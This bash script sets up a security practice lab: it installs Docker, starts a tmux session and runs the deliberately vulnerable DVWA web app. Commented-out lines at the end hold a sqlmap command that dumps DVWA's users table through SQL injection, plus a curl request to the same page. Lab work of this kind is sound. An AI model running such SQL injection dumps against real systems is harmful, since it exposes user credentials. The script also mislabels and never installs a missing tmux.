#!/bin/bash

#Check if tmux is installed
if command -v tmux >/dev/null 2>&1 ; then
        echo "tmux found"
        echo "version: $(tmux -V)"

        else
                echo "top not found"
                echo "$(sudo apt update)"
fi

#Check if docker is installed
if command -v docker >/dev/null 2>&1 ; then
            echo "docker found"
            echo "version: $(docker -v)"
        else
                echo "docker not found"
                echo "$(sudo apt-get install -y apt-transport-https ca-certificates curl gnupg lsb-release)"
                echo "$(curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg)"
                echo "$(echo \
                        "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
                        $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null)"
                echo "$(sudo apt-get update)"
                echo "$(sudo apt-get install docker-ce docker-ce-cli containerd.io)"
fi

# Create a new tux session named "targetSrv"
tmux new-session -d -s "targetSrv"

# Start Docker
tmux send-keys -t "targetSrv" "sudo systemctl start docker" Enter

# Create and setup target environment (dvwa server)
tmux send-keys -t "targetSrv" "docker run --rm -it -p 80:80 vulnerables/web-dvwa" Enter


#Attack

#sqlmap --url http://10.27.55.25/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie=' ' -D dvwa -T users --dump

#curl -c - 'http://10.27.55.25/vulnerabilities/sqli/?id=1\&Submit=Submit#'
